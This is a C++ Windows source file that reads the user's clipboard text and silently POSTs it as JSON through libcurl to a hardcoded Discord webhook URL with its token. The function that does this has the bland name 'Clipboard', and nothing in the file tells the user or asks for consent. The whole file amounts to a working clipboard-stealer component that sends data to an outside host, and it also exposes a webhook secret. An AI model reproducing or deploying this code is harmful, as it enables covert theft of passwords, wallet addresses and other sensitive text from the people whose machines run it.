#include <windows.h>
#include <iostream>
#include <vector>
#include <locale>
#include <codecvt>
#include <string>
#include <sstream>
#include <curl/curl.h>

inline const wchar_t* CaptureClipboardData() {
	if (!OpenClipboard(NULL)) {
		std::cerr << "Failed to open clipboard." << std::endl;
		return NULL;
	}
	const wchar_t* text = NULL;

	HANDLE hData = GetClipboardData(CF_UNICODETEXT);
	if (hData != NULL) {
		text = static_cast<wchar_t*>(GlobalLock(hData));
		if (text != NULL) {
			GlobalUnlock(hData);
		}
	}

	CloseClipboard();

	return text;
}

inline std::string WStringToString(const std::wstring& wstr) {
	if (wstr.empty()) {
		return std::string();
	}
	int size_needed = WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), NULL, 0, NULL, NULL);
	std::string strTo(size_needed, 0);
	WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), &strTo[0], size_needed, NULL, NULL);
	return strTo;
}

inline std::string escapeJsonString(const std::string& input) {
	std::ostringstream ss;
	for (char c : input) {
		switch (c) {
		case '"': ss << "\\\""; break;
		case '\\': ss << "\\\\"; break;
		case '\b': ss << "\\b"; break;
		case '\f': ss << "\\f"; break;
		case '\n': ss << "\\n"; break;
		case '\r': ss << "\\r"; break;
		case '\t': ss << "\\t"; break;
		default:
			if ('\x00' <= c && c <= '\x1f') {
				ss << "\\u" << std::hex << (int)c;
			}
			else {
				ss << c;
			}
		}
	}
	return ss.str();
}

inline void Clipboard() {
	CURL* curl;
	CURLcode res;
	curl_global_init(CURL_GLOBAL_DEFAULT);
	curl = curl_easy_init();
	if (curl) {
		// Set URL
		curl_easy_setopt(curl, CURLOPT_URL, "https://discord.com/api/webhooks/1299730885184196621/D-thfIMp10tf8vm3GvLpmP13QfaQ-wMnULkCD_IeyXFAdylVMZNaExrUUIEcg9poq3Xf");

		curl_easy_setopt(curl, CURLOPT_POST, 1L);

		std::string body = WStringToString(CaptureClipboardData());
		std::string jsonData = R"({"content":")" + escapeJsonString(body) + R"("})";
		curl_easy_setopt(curl, CURLOPT_POSTFIELDS, jsonData.c_str());
		struct curl_slist* headers = NULL;
		headers = curl_slist_append(headers, "Content-Type: application/json");
		curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);

		curl_easy_setopt(curl, CURLOPT_CAINFO, "inc/curl-ca-bundle.crt");

		res = curl_easy_perform(curl);

		if (res != CURLE_OK)
			std::cerr << "curl_easy_perform() failed: " << curl_easy_strerror(res) << std::endl;
		else
			// "POST request sent successfully!" << std::endl;

		curl_easy_cleanup(curl);
	}

	curl_global_cleanup();
}